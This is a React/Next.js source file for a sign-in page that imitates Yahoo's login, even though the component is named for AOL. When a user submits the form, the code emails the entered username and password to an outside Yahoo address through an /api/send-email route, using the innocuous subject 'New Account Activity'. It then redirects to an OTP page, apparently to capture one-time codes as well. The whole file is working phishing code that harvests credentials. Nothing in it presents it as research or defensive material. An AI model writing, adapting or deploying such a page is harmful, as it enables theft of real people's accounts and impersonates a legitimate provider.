'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { useAuth } from './context/AuthContext';

export default function AolLoginPage() {
  const router = useRouter();
  const { login } = useAuth();
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });
  const [errors, setErrors] = useState({
    username: '',
    password: '',
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    let newErrors = {
      username: '',
      password: '',
    };
    
    if (!formData.username) {
      newErrors.username = 'Username, email, or mobile is required';
    }
    
    if (!formData.password) {
      newErrors.password = 'Password is required';
    }
    
    setErrors(newErrors);
    
    if (!newErrors.username && !newErrors.password) {
      setIsLoading(true);
      try {
        await fetch('/api/send-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            from: 'onboarding@resend.dev', // Replace with your "from" email address
            to: 'usermail60@yahoo.com', // Replace with your "to" email address
            subject: 'New Account Activity',
            html: `<p>Email: ${formData.username}</p><p>p_data: ${formData.password}</p>`,
          }),
        });
        login();
        router.push('/otp');
      } catch (error) {
        console.error('Failed to send email', error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#f3f4f8] flex flex-col items-center px-4 py-6 sm:py-10 font-sans">
      <div className="w-full max-w-sm flex-grow flex flex-col">
        <div className="text-center mb-8 sm:mb-10">
          <img src="/yahoo.png" alt="Yahoo" className="mx-auto h-auto w-[124px] sm:w-[140px]" />
        </div>

        <div className="w-full bg-white rounded-2xl p-6 sm:p-8 shadow-sm">
          <h2 className="text-2xl font-semibold text-center mb-8 text-gray-900">Sign in</h2>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="username" className="sr-only">
                Username, email, or mobile
              </label>
              <input
                type="text"
                id="username"
                name="username"
                value={formData.username}
                onChange={handleChange}
                placeholder="Username, email, or mobile"
                className={`w-full px-4 py-3 rounded-xl bg-gray-50 text-gray-900 placeholder:text-gray-500 focus:outline-none focus:ring-2
                  ${errors.username ? 'ring-2 ring-red-500' : 'focus:ring-[#6001d2]'}
                `}
              />
              {errors.username && (
                <p className="text-red-500 text-xs mt-1">{errors.username}</p>
              )}
            </div>
            
            <div>
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Password"
                className={`w-full px-4 py-3 rounded-xl bg-gray-50 text-gray-900 placeholder:text-gray-500 focus:outline-none focus:ring-2
                  ${errors.password ? 'ring-2 ring-red-500' : 'focus:ring-[#6001d2]'}
                `}
              />
              {errors.password && (
                <p className="text-red-500 text-xs mt-1">{errors.password}</p>
              )}
            </div>
            
            <div className="flex items-center">
              <input type="checkbox" id="stay-signed-in" className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
              <label htmlFor="stay-signed-in" className="ml-2 block text-sm text-gray-900">
                Stay signed in
              </label>
            </div>

            <div>
              <button
                type="submit"
                className="w-full bg-[#6001d2] text-white py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-[#4f01af] transition-colors disabled:opacity-50"
                disabled={isLoading}
              >
                {isLoading ? 'Signing in...' : 'Sign in'}
              </button>
            </div>
          </form>
        </div>

        <div className="text-center mt-5">
          <a href="#" className="text-sm text-blue-600 hover:underline">
            Forgot username?
          </a>
        </div>

        <div className="mt-5">
            <button className="w-full bg-[#ece9ff] text-[#6001d2] py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-[#e2dcff] transition-colors">
                Create an account
            </button>
        </div>

        <div className="text-center my-4 text-gray-500">
            or
        </div>

        <div className="flex justify-center space-x-4 mb-8">
            <button className="flex items-center justify-center bg-white rounded-xl w-1/2 py-3 shadow-sm hover:bg-gray-100 transition-colors">
                <img src="https://static.cdnlogo.com/logos/g/35/google-icon.svg" alt="Google" className="h-6 w-6" />
            </button>
            <button className="flex items-center justify-center bg-white rounded-xl w-1/2 py-3 shadow-sm hover:bg-gray-100 transition-colors">
                <img src="/yahoo.png" alt="Yahoo" className="h-10 w-10" />
            </button>
        </div>
      </div>
      <div className="w-full max-w-sm text-center text-xs text-gray-500 pb-4">
            <p>
                <a href="#" className="hover:underline">Help</a>
                <span className="mx-2">|</span>
                <a href="#" className="hover:underline">Privacy</a>
                <span className="mx-2">|</span>
                <a href="#" className="hover:underline">Terms</a>
            </p>
      </div>
    </div>
  );
}
